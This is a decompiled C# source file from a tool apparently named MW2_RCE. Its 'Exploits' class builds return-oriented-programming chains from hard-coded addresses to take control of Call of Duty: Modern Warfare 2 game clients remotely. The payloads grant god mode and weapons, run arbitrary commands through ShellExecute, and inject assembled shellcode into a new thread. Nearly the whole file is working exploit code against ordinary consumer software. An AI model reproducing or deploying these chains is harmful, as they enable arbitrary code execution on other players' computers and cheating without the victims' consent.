using System;
using Binarysharp.Assemblers.Fasm;
using System.Net.Sockets;

namespace MW2_RCE
{
	// Token: 0x0200000F RID: 15
	internal class Exploits
	{
		// Token: 0x060000B3 RID: 179 RVA: 0x00007D1C File Offset: 0x00005F1C
		public static ExploitBuilder SetXP(int xp)
		{
			ExploitBuilder exp = new ExploitBuilder();
			exp.writeInt(28882920, xp);
			return exp;
		}

		// Token: 0x060000B4 RID: 180 RVA: 0x00007D44 File Offset: 0x00005F44
		public static ExploitBuilder GiveWeapon(int clientid, int weaponid, bool akimbo)
		{
			ExploitBuilder exp2 = new ExploitBuilder();
			int ent = 26524112 + 628 * clientid;
			int entps = 26524456 + 628 * clientid;
			exp2.addInt(4199159);
			exp2.addInt(entps);
			exp2.addInt(5769048);
			exp2.addInt(4257472);
			exp2.addInt(5284421);
			exp2.addInt(5246274);
			exp2.addInt(5246274);
			exp2.addInt(5246274);
			exp2.addInt(5246274);
			exp2.addInt(4207009);
			exp2.addInt(5574352);
			exp2.addInt(4955533);
			exp2.pop(4);
			exp2.addInt(0);
			exp2.addInt(weaponid);
			exp2.addInt(0);
			exp2.addInt(akimbo ? 1 : 0);
			exp2.addInt(6773599);
			exp2.addInt(weaponid);
			exp2.addInt(4269894);
			exp2.addInt(ent);
			exp2.addInt(5373664);
			exp2.pop(2);
			exp2.addInt(0);
			exp2.addInt(0);
			exp2.addInt(5573376);
			exp2.pop(2);
			exp2.addInt(clientid);
			exp2.addInt(weaponid);
			return exp2;
		}

		// Token: 0x060000B5 RID: 181 RVA: 0x00007EA4 File Offset: 0x000060A4
		public static ExploitBuilder CBuf_AddText(string text)
		{
			ExploitBuilder exp3 = new ExploitBuilder();
			exp3.writeData(105043897, text);
			exp3.addInt(5651728);
			exp3.pop(2);
			exp3.addInt(0);
			exp3.addInt(105043897);
			return exp3;
		}

		// Token: 0x060000B6 RID: 182 RVA: 0x00007EF4 File Offset: 0x000060F4
		public static ExploitBuilder NoClip(int clientid, bool enabled)
		{
			ExploitBuilder exp4 = new ExploitBuilder();
			exp4.writeInt(28382548 + clientid * 13932, enabled ? 2 : 0);
			return exp4;
		}

		// Token: 0x060000B7 RID: 183 RVA: 0x00007F28 File Offset: 0x00006128
		public static ExploitBuilder GodMode(int clientid, bool enabled)
		{
			ExploitBuilder exp5 = new ExploitBuilder();
			exp5.writeInt(28382068 + clientid * 13932, enabled ? int.MaxValue : 100);
			exp5.writeInt(26524524 + clientid * 628, enabled ? int.MaxValue : 100);
			return exp5;
		}

		// Token: 0x060000B8 RID: 184 RVA: 0x00007F84 File Offset: 0x00006184
		public static ExploitBuilder GSSC(int target, string text)
		{
			ExploitBuilder exp6 = new ExploitBuilder();
			exp6.writeData(105043897, text);
			exp6.addInt(5801088);
			exp6.pop(3);
			exp6.addInt(target);
			exp6.addInt(1);
			exp6.addInt(105043897);
			return exp6;
		}

		// Token: 0x060000B9 RID: 185 RVA: 0x00007FDC File Offset: 0x000061DC
		public static ExploitBuilder ShellExecute(string text, bool show = false)
		{
			ExploitBuilder exp7 = new ExploitBuilder();
			exp7.writeData(105043897, text);
			exp7.addInt(4199159);
			exp7.addInt(6804088);
			exp7.addInt(5769048);
			exp7.addInt(0);
			exp7.addInt(4240263);
			exp7.pop(6);
			exp7.addInt(0);
			exp7.addInt(0);
			exp7.addInt(105043897);
			exp7.addInt(0);
			exp7.addInt(0);
			exp7.addInt(show ? 5 : 0);
			exp7.addInt(0);
			exp7.addInt(0);
			exp7.addInt(0);
			exp7.addInt(0);
			exp7.addInt(0);
			exp7.addInt(0);
			return exp7;
		}

		// Token: 0x060000BA RID: 186 RVA: 0x000080AC File Offset: 0x000062AC
		public static ExploitBuilder ChangeMap(string mapname)
		{
			ExploitBuilder exp8 = new ExploitBuilder();
			exp8.writeData(105043897, mapname);
			exp8.addInt(6023264);
			exp8.pop(2);
			exp8.addInt(6878860);
			exp8.addInt(105043897);
			return exp8;
		}

		// Token: 0x060000BB RID: 187 RVA: 0x00008100 File Offset: 0x00006300
		public static ExploitBuilder FastRestart()
		{
			ExploitBuilder exp9 = new ExploitBuilder();
			exp9.addInt(5788640);
			return exp9;
		}

		// Token: 0x060000BC RID: 188 RVA: 0x00008128 File Offset: 0x00006328
		public static ExploitBuilder NewExploit()
		{
			ExploitBuilder expx = new ExploitBuilder();
			string[] mnemonics = new string[]
			{
				"use32",
				"mov eax, 0x005853E0",
				"call eax",
				"ret"
			};
			byte[] shellc = FasmNet.Assemble(mnemonics);
			expx.executeShellcodeInNewThread(shellc);
			return expx;
		}

		// Token: 0x0400004D RID: 77
		private const int UNUSED_DATA_POINTER = 105043897;

		// Token: 0x0400004E RID: 78
		private const int UNUSED_MEMORY_POINTER = 105043864;
	}
}
